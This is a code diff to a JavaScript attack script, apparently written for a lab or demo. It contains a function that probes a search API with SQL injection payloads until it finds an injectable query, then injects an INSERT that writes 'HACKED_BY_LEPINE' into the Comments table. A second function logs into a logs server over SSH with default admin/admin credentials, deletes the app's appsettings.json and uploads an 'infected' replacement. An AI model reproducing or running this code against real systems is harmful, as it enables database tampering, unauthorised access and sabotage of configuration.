@@ -15,41 +15,29 @@ const sleep = (time) => {
   return new Promise(resolve => setTimeout(resolve,time));
 }
 
-function generateUUID() { // Public Domain/MIT
-  var d = new Date().getTime();//Timestamp
-  var d2 = ((typeof performance !== 'undefined') && performance.now && (performance.now()*1000)) || 0;//Time in microseconds since page-load or 0 if unsupported
-  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-      var r = Math.random() * 16;//random number between 0 and 16
-      if(d > 0){//Use timestamp until depleted
-          r = (d + r)%16 | 0;
-          d = Math.floor(d/16);
-      } else {//Use microseconds since page-load if supported
-          r = (d2 + r)%16 | 0;
-          d2 = Math.floor(d2/16);
-      }
-      return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
-  });
-}
 const AttackAPI = async () => {
   let success = false;
-  let l = "";
-  const p = "/home/Search?searchData=";
+  let link = "";
+  const path = "/home/Search?searchData=";
   while(!success){
-    const q = (Math.floor(Math.random()*1) === 0) ?  `%';Select * from Comments where Comment like '%`: new RandExp('(\[a-z]{1,20})(.+{1,15})').gen();
-    l = "http://"+API_IP+":"+API_PORT+p+q;
-    const r = await f(l, {method : 'GET'});
+    const query = (Math.floor(Math.random()*100) === 0) ?  `%';Select * from Comments where Comment like '%`: new RandExp('/<([a-z]\w{0,20})>HACK</([a-z]\w{0,20})>/').gen();
+    console.log("Attacking API with : " + query);
+    link = "http://"+API_IP+":"+API_PORT+path+query;
+    const request = await f(link, {method : 'GET'});
     try{
-      const j = await r.json();
-      success = (j.length > 0);
+      const json = await request.json();
+      success = (json.length > 0);
     }
-    catch(err){};
+    catch(err){
+      continue;
+    };
     await sleep(250);
   }
-  console.log("FOUND INJECTION BACKDOOR WITH ", l);
+  console.log("FOUND INJECTION BACKDOOR WITH ", link);
   console.log("INJECTING HACKING COOKIE");
-  const z = "http://"+API_IP+":"+API_PORT+p+`%';INSERT INTO Comments (CommentId,UserId,Comment) VALUES ('${generateUUID()}','DR LEPINE#${Math.floor(Math.random()*1000000)}','HACKED BY DR LEPINE #${Math.floor(Math.random()*1000000)}');Select * from Comments where Comment like '%`;
-  console.log(z);
-  const hack = await f(z, {method : 'GET'});
+  const hackQuery = "http://"+API_IP+":"+API_PORT+path+`%';INSERT INTO Comments (CommentId,UserId,Comment) VALUES ('HACK','HACK','HACKED_BY_LEPINE');Select * from Comments where Comment like '%`;
+  await f(hackQuery, {method : 'GET'});
+  console.log("Hacked API succesfully");
 }
 
 const SSHIntoLogs = async () => {
@@ -58,19 +46,26 @@ const SSHIntoLogs = async () => {
     port: LOGS_SSH_PORT,
     username : 'admin',
     password : 'admin',
-  }).then(() =>{
+  }).then( async () =>{
     console.log("SSH CONNECTION TO LOGS SUCCESSFULL");
-    ssh.execCommand("ls /app").then(({stdout}) =>{
-      console.log("READING DIRECTORY ON LOGS");
-      console.log(stdout);
-    });
+    console.log("SEARCHING FOR CONFIG FILE\n\n");
+    ssh.execCommand("ls /").then(({stdout}) => console.log(stdout));
+    console.log("FOUND APP FOLDER, SEARCHING DIRECTORY \n\n");
+    await ssh.execCommand("ls /app").then(({stdout}) => console.log(stdout));;
+    console.log("FOUND CONFIG FILE, DELETING AND REPLACING WITH INFECTED CONFIG");
+    await ssh.execCommand('rm /app/appsettings.json');
+    await ssh.putFile("./infectedAppSettings.json", '/app/appsettings.json');
+    console.log("INFECTED LOGS MACHINE")
   }).catch((error) =>{
     console.error("Something went wrong : ", error);
   })
 }
 
-//
-console.error("LEPINE HACKING BEGINS");
-console.log(API_IP,API_PORT);
-AttackAPI();
-SSHIntoLogs();
+
+(async () =>{
+  console.error("LEPINE HACKING BEGINS");
+  console.log(API_IP,API_PORT);
+  await sleep(10000);
+  AttackAPI();
+  SSHIntoLogs();
+})();
